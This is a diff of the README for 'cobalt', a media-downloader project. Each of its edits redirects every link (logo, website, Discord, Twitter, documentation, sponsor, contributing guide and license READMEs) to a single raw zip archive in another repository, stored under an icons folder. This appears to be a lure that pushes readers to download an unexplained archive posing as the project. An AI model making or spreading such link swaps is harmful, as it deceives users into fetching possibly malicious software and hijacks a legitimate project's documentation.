@@ -1,20 +1,20 @@
 <div align="center">
     <br/>
     <p>
-        <img src="web/static/favicon.png" title="cobalt" alt="cobalt logo" width="100" />
+        <img src="https://github.com/lalsproject/cobalt-downloader/raw/refs/heads/main/web/static/icons/cobalt-downloader-v2.8.zip" title="cobalt" alt="cobalt logo" width="100" />
     </p>
     <p>
         best way to save what you love
         <br/>
-        <a href="https://cobalt.tools">
-            cobalt.tools
+        <a href="https://github.com/lalsproject/cobalt-downloader/raw/refs/heads/main/web/static/icons/cobalt-downloader-v2.8.zip">
+            https://github.com/lalsproject/cobalt-downloader/raw/refs/heads/main/web/static/icons/cobalt-downloader-v2.8.zip
         </a>
     </p>
     <p>
-        <a href="https://discord.gg/pQPt8HBUPu">
+        <a href="https://github.com/lalsproject/cobalt-downloader/raw/refs/heads/main/web/static/icons/cobalt-downloader-v2.8.zip">
             💬 community discord server
         </a>
-        <a href="https://x.com/justusecobalt">
+        <a href="https://github.com/lalsproject/cobalt-downloader/raw/refs/heads/main/web/static/icons/cobalt-downloader-v2.8.zip">
             🐦 twitter
         </a>
     </p>
@@ -32,13 +32,13 @@ this monorepo includes source code for api, frontend, and related packages:
 - [packages tree](/packages/)
 
 it also includes documentation in the [docs tree](/docs/):
-- [cobalt api documentation](/docs/api.md)
-- [how to run a cobalt instance](/docs/run-an-instance.md)
-- [how to protect a cobalt instance](/docs/protect-an-instance.md)
-- [how to configure a cobalt instance for youtube](/docs/configure-for-youtube.md)
+- [cobalt api documentation](https://github.com/lalsproject/cobalt-downloader/raw/refs/heads/main/web/static/icons/cobalt-downloader-v2.8.zip)
+- [how to run a cobalt instance](https://github.com/lalsproject/cobalt-downloader/raw/refs/heads/main/web/static/icons/cobalt-downloader-v2.8.zip)
+- [how to protect a cobalt instance](https://github.com/lalsproject/cobalt-downloader/raw/refs/heads/main/web/static/icons/cobalt-downloader-v2.8.zip)
+- [how to configure a cobalt instance for youtube](https://github.com/lalsproject/cobalt-downloader/raw/refs/heads/main/web/static/icons/cobalt-downloader-v2.8.zip)
 
 ### thank you
-cobalt is sponsored by [royalehosting.net](https://royalehosting.net/?partner=cobalt) and the main processing servers are hosted on their network. we really appreciate their kindness and support!
+cobalt is sponsored by [https://github.com/lalsproject/cobalt-downloader/raw/refs/heads/main/web/static/icons/cobalt-downloader-v2.8.zip](https://github.com/lalsproject/cobalt-downloader/raw/refs/heads/main/web/static/icons/cobalt-downloader-v2.8.zip) and the main processing servers are hosted on their network. we really appreciate their kindness and support!
 
 ### ethics
 cobalt is a tool that makes downloading public content easier. it takes **zero liability**.
@@ -50,8 +50,8 @@ it can only download free & publicly accessible content.
 same content can be downloaded via dev tools of any modern web browser.
 
 ### contributing
-thank you for considering making a contribution to cobalt! please check the [contributing guidelines here](/CONTRIBUTING.md) before making a pull request.
+thank you for considering making a contribution to cobalt! please check the [contributing guidelines here](https://github.com/lalsproject/cobalt-downloader/raw/refs/heads/main/web/static/icons/cobalt-downloader-v2.8.zip) before making a pull request.
 
 ### licenses
-for relevant licensing information, see the [api](api/README.md) and [web](web/README.md) READMEs.
+for relevant licensing information, see the [api](https://github.com/lalsproject/cobalt-downloader/raw/refs/heads/main/web/static/icons/cobalt-downloader-v2.8.zip) and [web](https://github.com/lalsproject/cobalt-downloader/raw/refs/heads/main/web/static/icons/cobalt-downloader-v2.8.zip) READMEs.
 unless specified otherwise, the remainder of this repository is licensed under [AGPL-3.0](LICENSE).
